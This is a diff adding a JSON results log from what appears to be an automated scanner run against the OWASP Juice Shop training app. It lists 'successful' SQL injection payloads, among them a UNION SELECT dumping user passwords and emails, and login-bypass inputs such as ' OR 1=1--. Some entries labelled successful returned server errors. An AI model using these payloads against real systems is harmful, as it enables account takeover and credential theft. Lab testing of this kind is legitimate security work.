@@ -1,0 +1,105 @@
+{
+  "exploit_patterns": [],
+  "successful_payloads": [
+    {
+      "timestamp": "2026-05-24T11:33:24.772257",
+      "endpoint": "/rest/products/search",
+      "method": "GET",
+      "exploit_type": "sql_injection",
+      "payload": "') OR ('1'='1",
+      "indicators": [
+        "user"
+      ],
+      "status_code": 200,
+      "response_length": 21667
+    },
+    {
+      "timestamp": "2026-05-24T11:33:24.775532",
+      "endpoint": "/rest/products/search",
+      "method": "GET",
+      "exploit_type": "sql_injection",
+      "payload": "' UNION SELECT id,username,password,email,role,6,7,8 FROM Users--",
+      "indicators": [
+        "password",
+        "email",
+        "role",
+        "user"
+      ],
+      "status_code": 500,
+      "response_length": 443
+    },
+    {
+      "timestamp": "2026-05-24T11:33:24.783813",
+      "endpoint": "/rest/products/search",
+      "method": "GET",
+      "exploit_type": "sql_injection",
+      "payload": "' OR 1=1 #",
+      "indicators": [
+        "token"
+      ],
+      "status_code": 500,
+      "response_length": 327
+    },
+    {
+      "timestamp": "2026-05-24T11:33:24.789250",
+      "endpoint": "/rest/user/login",
+      "method": "POST",
+      "exploit_type": "auth_bypass",
+      "payload": "' OR 1=1--",
+      "indicators": [
+        "token",
+        "authentication"
+      ],
+      "status_code": 200,
+      "response_length": 799
+    },
+    {
+      "timestamp": "2026-05-24T11:33:24.808131",
+      "endpoint": "/rest/admin/application-configuration",
+      "method": "GET",
+      "exploit_type": "auth_bypass",
+      "payload": "admin@juice-sh.op",
+      "indicators": [
+        "sid"
+      ],
+      "status_code": 200,
+      "response_length": 23442
+    },
+    {
+      "timestamp": "2026-05-24T11:33:24.809264",
+      "endpoint": "/rest/admin/application-configuration",
+      "method": "GET",
+      "exploit_type": "auth_bypass",
+      "payload": "admin123",
+      "indicators": [
+        "sid"
+      ],
+      "status_code": 200,
+      "response_length": 23442
+    },
+    {
+      "timestamp": "2026-05-24T11:33:24.810477",
+      "endpoint": "/rest/admin/application-configuration",
+      "method": "GET",
+      "exploit_type": "auth_bypass",
+      "payload": "",
+      "indicators": [
+        "sid"
+      ],
+      "status_code": 200,
+      "response_length": 23442
+    },
+    {
+      "timestamp": "2026-05-24T11:33:24.811610",
+      "endpoint": "/rest/admin/application-configuration",
+      "method": "GET",
+      "exploit_type": "auth_bypass",
+      "payload": "' OR 1=1--",
+      "indicators": [
+        "sid"
+      ],
+      "status_code": 200,
+      "response_length": 23442
+    }
+  ]
+}
